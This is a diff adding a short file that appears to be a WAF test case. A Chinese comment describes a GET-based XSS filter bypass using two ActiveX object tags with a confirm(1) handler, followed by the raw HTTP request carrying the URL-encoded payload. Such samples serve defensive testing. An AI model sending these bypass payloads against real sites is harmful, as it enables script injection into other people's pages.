@@ -1,0 +1,9 @@
+# XSS跨站脚本_GET_事件_关键字替换类(object标签绕过)-06506815
+# 攻击者使用了两个<object>标签，以不同的classid属性值引入两个ActiveX对象，其中第二个<object>标签的onqt_error属性中包含了confirm(1)的代码，用于弹出一个确认对话框
+GET /?id=%3Cobject%20id=%22x%22%20classid=%22clsid:CB927D12-4FF7-4a9e-A169-56E4B8A75598%22%3E%3C%2Fobject%3E%3Cobject%20classid=%22clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B%22%20onqt_error=%22confirm%281%29%22%20style=%22behavior:url%28%23x%29%3B%22%3E%3Cparam%20name=postdomevents%20%2F%3E%3C%2Fobject%3E&bid=hd_tag_m8mv250s HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv250s
+RM-PRO-Token: 0e7b89fa50acc3972564b4dd1243a22c
+RM-PRO-Time: 1742808429112
+User-Agent: curl/7.83.1
+
